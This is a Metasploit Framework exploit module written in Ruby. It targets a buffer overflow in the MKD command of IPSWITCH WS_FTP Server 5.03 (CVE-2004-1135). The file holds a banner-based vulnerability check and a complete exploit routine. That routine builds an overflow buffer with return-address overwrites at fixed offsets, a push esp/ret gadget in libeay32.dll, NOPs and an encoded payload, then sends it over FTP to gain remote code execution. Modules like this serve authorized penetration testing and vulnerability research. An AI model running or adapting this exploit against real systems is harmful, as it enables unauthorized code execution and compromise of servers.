##
# $Id: wsftp_server_503_mkd.rb 10559 2010-10-05 23:41:17Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WS-FTP Server 5.03 MKD Overflow',
			'Description'    => %q{
				This module exploits the buffer overflow found in the MKD
				command in IPSWITCH WS_FTP Server 5.03 discovered by Reed
				Arvin.
			},
			'Author'         => [ 'et', 'Reed Arvin <reedarvin@gmail.com>' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 10559 $',
			'Platform'       => [ 'win' ],
			'References'     =>
				[
					[ 'CVE', '2004-1135' ],
					[ 'OSVDB', '12509' ],
					[ 'BID', '11772'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 480,
					'BadChars' => "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[
						'WS-FTP Server 5.03 Universal',
						{
							'Ret'      => 0x25185bb8,
							# Address is executable to allow XP and 2K
							# 0x25185bb8 = push esp, ret (libeay32.dll)
							# B85B1825XX = mov eax,0xXX25185b
						},
					],
				],
			'DisclosureDate' => 'Nov 29 2004',
			'DefaultTarget' => 0))
	end

	def check
		connect
		disconnect
		if (banner =~ /5\.0\.3/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect_login

		print_status("Trying target #{target.name}...")

		buf         = rand_text_alphanumeric(8192)
		buf[498, 4] = [ 0x7ffd3001 ].pack('V')
		buf[514, 4] = [ target.ret ].pack('V')
		buf[518, 4] = [ target.ret ].pack('V')
		buf[522, 2] = make_nops(2)
		buf[524, payload.encoded.length] = payload.encoded

		send_cmd( ['MKD', buf], true );

		handler
		disconnect
	end

end
